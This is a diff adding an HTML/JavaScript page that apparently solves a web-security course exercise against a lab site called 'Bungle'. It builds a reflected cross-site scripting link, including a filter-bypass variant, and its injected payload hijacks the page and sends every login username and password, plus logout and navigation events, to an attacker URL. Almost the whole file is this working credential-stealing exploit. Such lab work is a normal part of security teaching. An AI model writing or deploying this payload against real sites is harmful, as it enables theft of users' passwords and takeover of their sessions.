@@ -1,0 +1,105 @@
+<meta charset="utf-8">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script>
+// Extend this function:
+function payload(attacker) {
+  function log(data) {
+    console.log($.param(data))
+    $.get(attacker, data);
+  }
+
+  function addListeners(){
+    $("#search-btn").click(function(event){
+      event.preventDefault();
+      proxy('./search?q='+$("#query").val())
+    });
+    $("#bungle-lnk,#search-again-btn").click(function(event){
+      event.preventDefault();
+      proxy('./');
+    });
+    $("#log-in-btn").off('click').on("click",function(event){
+      event.preventDefault();
+      log({event: "login", user: $("#username").val(), pass:$("#userpass").val()});
+      $("html").load("./login",{"username":$("#username").val(), "password": $("#userpass").val()}, function(response, status, xhr){
+        if(status=="error"){
+          //alert(response.replace("<html>", "").replace("</html>", "").replace(/<!DOCTYPE(.*)>/,""));
+          $("html").html(response.replace("<html>", "").replace("</html>", "").replace(/<!DOCTYPE(.*)>/,"")).removeAttr("style");
+        }
+        addListeners();
+
+      });
+    });
+    $("#new-account-btn").off('click').on("click",function(event){
+      event.preventDefault();
+      $("html").load("./create",{"username":$("#username").val(), "password": $("#userpass").val()}, function(response, status, xhr){
+        if(status=="error"){
+          //alert(response.replace("<html>", "").replace("</html>", "").replace(/<!DOCTYPE(.*)>/,""));
+          $("html").html(response.replace("<html>", "").replace("</html>", "").replace(/<!DOCTYPE(.*)>/,"")).removeAttr("style");
+        }
+        addListeners();
+
+      });
+    });
+
+    $("#log-out-btn").click(function(event){
+      log({event: "logout", user: $("#logged-in-user").text()});
+      event.preventDefault();
+      $("html").load("./logout",{}, addListeners);
+    });
+  }
+  function proxy(href) {
+    $("html").load(href, function(){
+      $("html").show();
+
+      log({event: "nav", uri: href});
+      history.pushState(null, null, href);
+      addListeners();
+
+    });
+
+  }
+  window.onpopstate=function(event){
+    $("html").load(document.location.pathname, function(){
+      $("html").show();
+      log({event: "nav", uri: document.location.pathname});
+      addListeners();
+    });
+  };
+  $("html").hide();
+  $("html").load("./", function(){
+    $("html").show();
+
+    log({event: "nav", uri: "./"});
+    history.replaceState(null, null, "./");
+    addListeners();
+
+  });
+
+
+}
+
+function makeLink(xssdefense, target, attacker) {
+  if (xssdefense == 0) {
+    return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+    encodeURIComponent("<script" + ">" + payload.toString() +
+    ";payload(\"" + attacker + "\");</script" + ">");
+  } else if(xssdefense==1){
+    return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+    encodeURIComponent("<s%26ript" + ">" + payload.toString() +
+    ";payload(\"" + attacker + "\");</script" + ">");
+  }
+  else{
+  // Implement code to defeat XSS defenses here.
+  }
+}
+
+var xssdefense = 1;
+var target = "http://permalink.co/";
+var attacker = "http://127.0.0.1:31337/stolen";
+$(function() {
+  var url = makeLink(xssdefense, target, attacker);
+  $("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
+});
+
+</script>
+<h3></h3>
